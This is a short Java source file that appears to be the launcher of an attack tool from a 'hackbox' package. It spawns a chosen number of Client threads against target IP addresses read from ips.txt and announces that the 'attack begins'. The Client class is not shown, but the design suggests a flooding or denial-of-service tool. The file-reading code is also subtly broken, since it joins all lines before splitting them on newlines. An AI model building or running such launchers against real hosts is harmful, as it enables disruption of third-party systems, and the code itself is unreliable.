package cn.hackbox.yxiaoc.cc;


import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

/**
 * @author Yxiaoc
 */
public class Main {

	public static void main(String[] args) {
		if (args.length != 2){
			System.out.println("please give me thread number,Thanks");
		}else{
			int num = Integer.parseInt(args[0]);
			for (int i = 1 ; i <= num ; i ++){
				new Client(i,readFileContent("ips.txt").split("\n"),args[1]).start();
			}
		}
		System.out.println("Thread creation is complete and attack begins");
	}
	public static String readFileContent(String fileName) {
		File file = new File(fileName);
		BufferedReader reader = null;
		StringBuilder sbf = new StringBuilder();
		try {
			reader = new BufferedReader(new FileReader(file));
			String tempStr;
			while ((tempStr = reader.readLine()) != null) {
				sbf.append(tempStr);
			}
			reader.close();
			return sbf.toString();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			if (reader != null) {
				try {
					reader.close();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
			}
		}
		return sbf.toString();
	}
}
